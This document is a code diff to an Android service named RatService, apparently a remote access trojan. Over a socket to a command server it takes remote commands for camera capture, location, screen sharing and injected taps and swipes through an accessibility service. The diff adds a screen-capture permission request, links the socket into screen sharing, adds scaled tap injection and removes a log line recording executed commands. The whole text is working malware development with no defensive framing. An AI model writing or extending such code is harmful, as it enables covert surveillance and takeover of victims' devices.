@@ -34,6 +34,8 @@ public class RatService extends Service {
         deviceId = getDeviceId();
         startForeground(1, buildNotification());
 
+        ScreenShareService.deviceId = deviceId;
+
         locationModule = new LocationModule(this, (lat, lon) -> {
             try {
                 JSONObject resp = new JSONObject();
@@ -85,6 +87,8 @@ public class RatService extends Service {
     private void connectSocket() {
         try {
             socket = IO.socket(SERVER_URL);
+            ScreenShareService.socket = socket;
+
             socket.on(Socket.EVENT_CONNECT, args -> {
                 Log.d(TAG, "Connected");
                 try {
@@ -101,7 +105,6 @@ public class RatService extends Service {
                 try {
                     JSONObject cmd = (JSONObject) args[0];
                     String action = cmd.getString("action");
-                    Log.d(TAG, "Execute: " + action);
                     handleCommand(action, cmd);
                 } catch (Exception e) {
                     Log.e(TAG, "Cmd error", e);
@@ -122,10 +125,16 @@ public class RatService extends Service {
             case "camera":
                 cameraModule.capturePhoto(cmd.optBoolean("front", false));
                 break;
+            case "request_screen":
+                Intent perm = new Intent(this, PermissionActivity.class);
+                perm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(perm);
+                break;
             case "touch":
-                float x = (float) cmd.optDouble("x", 0);
-                float y = (float) cmd.optDouble("y", 0);
-                PrisAccessibility.performTap(x, y);
+                float rx = (float) cmd.optDouble("x", 0);
+                float ry = (float) cmd.optDouble("y", 0);
+                boolean relative = cmd.optBoolean("relative", false);
+                handleTouch(rx, ry, relative);
                 break;
             case "swipe":
                 PrisAccessibility.performSwipe(
@@ -143,6 +152,18 @@ public class RatService extends Service {
             case "stop_screen":
                 stopService(new Intent(this, ScreenShareService.class));
                 break;
+        }
+    }
+
+    private void handleTouch(float x, float y, boolean relative) {
+        try {
+            int screenW = getResources().getDisplayMetrics().widthPixels;
+            int screenH = getResources().getDisplayMetrics().heightPixels;
+            float realX = relative ? x * screenW : x;
+            float realY = relative ? y * screenH : y;
+            PrisAccessibility.performTap(realX, realY);
+        } catch (Exception e) {
+            Log.e(TAG, "Touch error", e);
         }
     }
 
